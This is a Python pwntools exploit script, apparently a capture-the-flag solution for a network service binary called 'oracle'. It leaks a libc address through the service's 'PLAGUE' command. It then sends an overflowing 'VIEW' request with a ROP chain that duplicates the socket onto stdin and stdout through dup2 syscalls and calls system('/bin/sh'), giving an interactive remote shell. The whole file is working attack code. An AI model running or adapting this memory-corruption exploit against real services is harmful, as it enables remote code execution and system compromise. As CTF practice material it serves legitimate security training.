#!/usr/bin/env python3
from pwn import *

exe = ELF("./oracle_patched")

context.binary = exe

p = process([exe.path])
libc = ELF("libc-2.31.so")
# gdb.attach(p, gdbscript = '''

# c
# ''')

# input()

p = remote("0", 9001)
# p = remote('94.237.53.104', 37507)
    

payload = b'PLAGUE target_competitor: competitor123\r'
p.sendline(payload)
payload = b'Content-Length: 8\r\nPlague-Target: 8\r\n\r\n'
p.send(payload)
p.send(b'\xe0')

# p = remote('94.237.57.59', 31285)

p = remote("0", 9001)
# p = remote('94.237.53.104', 37507)

payload = b'PLAGUE target_competitor: competitor123\r'
p.sendline(payload)
payload = b'Content-Length: 8\r\nPlague-Target: 8\r\n\r\n'
p.send(payload)
p.send(b'\xe0')
p.recvuntil(b'plague: ')
libc.address = u64(p.recv(6) + b'\0\0') - 0x21ace0 + 0x2e100
print(hex(libc.address))

p = remote("0", 9001)
# p = remote('94.237.57.59', 31285)


# p = remote('94.237.53.104', 37507)
pop_rdi = ROP(libc).find_gadget(["pop rdi","ret"])[0]
rop = [pop_rdi+1,pop_rdi,next(libc.search(b"/bin/sh\0")),libc.sym.system]
rop = b"".join([p64(i) for i in rop])

pop_rax = ROP(libc).find_gadget(["pop rax","ret"])[0]
pop_rsi = ROP(libc).find_gadget(["pop rsi","ret"])[0]
syscall = ROP(libc).find_gadget(["syscall","ret"])[0]


payload = b'VIEW target_competitor: competitor123\r'
p.sendline(payload)
payload = b'a'.ljust(0xa38 - 0x208 - 1, b'a')  
payload += p64(pop_rax) + p64(0x21) + p64(pop_rsi) + p64(0) + p64(pop_rdi) + p64(0x6) + p64(syscall) 
payload += p64(pop_rax) + p64(0x21) + p64(pop_rsi) + p64(1) + p64(pop_rdi) + p64(0x6) + p64(syscall) 
payload += rop + b'\r\n\r\n'
p.send(payload)
# exec 1<&0
p.interactive()

# pop_rdi = ROP(libc).find_gadget(["pop rdi","ret"])[0]
# rop = [pop_rdi+1,pop_rdi,next(libc.search(b"/bin/sh\0")),libc.sym.system]
# rop = b"".join([p64(i) for i in rop])
